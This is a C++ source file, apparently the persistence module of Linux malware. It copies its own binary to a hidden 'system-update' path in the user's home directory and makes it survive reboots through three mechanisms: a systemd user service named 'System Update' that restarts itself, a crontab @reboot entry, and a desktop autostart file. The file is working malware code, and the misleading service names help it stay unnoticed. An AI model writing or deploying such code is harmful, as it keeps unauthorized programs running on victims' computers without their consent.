#include "Persistence.h"
#include <unistd.h>
#include <sys/stat.h>
#include <fstream>
#include <filesystem>
#include "../utils/Exec.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include <string>

namespace persistence {

namespace fs = std::filesystem;

bool InstallSystemdUser(const std::string& path) {
    char* home = getenv("HOME");
    if (!home) return false;
    std::string unitDir = std::string(home) + "/.config/systemd/user";
    std::string unitPath = unitDir + "/system-update.service";

    try {
        fs::create_directories(unitDir);
        std::ofstream f(unitPath);
        if (!f.is_open()) return false;
        f << "[Unit]\nDescription=System Update\nAfter=network.target\n\n[Service]\nExecStart=" << path << "\nRestart=always\nRestartSec=60\n\n[Install]\nWantedBy=default.target\n";
        f.close();

        utils::RunCommand("systemctl --user daemon-reload");
        utils::RunCommand("systemctl --user enable system-update.service");
    } catch (...) {
        return false;
    }
    return true;
}

bool InstallCron(const std::string& path) {
    // Add @reboot entry to user's crontab
    std::string cmd = "(crontab -l 2>/dev/null | grep -v \"" + path + "\"; echo \"@reboot " + path + "\") | crontab -";
    utils::RunCommand(cmd);
    return true;
}

bool InstallDesktopAutostart(const std::string& path) {
    char* home = getenv("HOME");
    if (!home) return false;
    std::string autoDir = std::string(home) + "/.config/autostart";
    std::string entryPath = autoDir + "/system-update.desktop";

    try {
        fs::create_directories(autoDir);
        std::ofstream f(entryPath);
        if (!f.is_open()) return false;
        f << "[Desktop Entry]\nType=Application\nName=System Update\nExec=" << path << "\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\n";
        f.close();
    } catch (...) {
        return false;
    }
    return true;
}

std::string establishPersistence(const std::string& overridePath) {
    (void)overridePath;
    char res[1024];
    ssize_t c = readlink("/proc/self/exe", res, 1024);
    if (c == -1) return "";

    std::string cur(res, (size_t)c);
    std::string home = getenv("HOME") ? getenv("HOME") : "/tmp";
    std::string targetDir = home + "/.local/share";
    std::string target = targetDir + "/system-update";

    try {
        fs::create_directories(targetDir);
        if (cur != target) {
            std::error_code ec;
            fs::copy_file(cur, target, fs::copy_options::overwrite_existing, ec);
            chmod(target.c_str(), S_IRWXU);
        }

        InstallSystemdUser(target);
        InstallCron(target);
        InstallDesktopAutostart(target);

    } catch (...) {
        return "";
    }

    return target;
}

void ReinstallPersistence() {
    establishPersistence();
}

} // namespace persistence
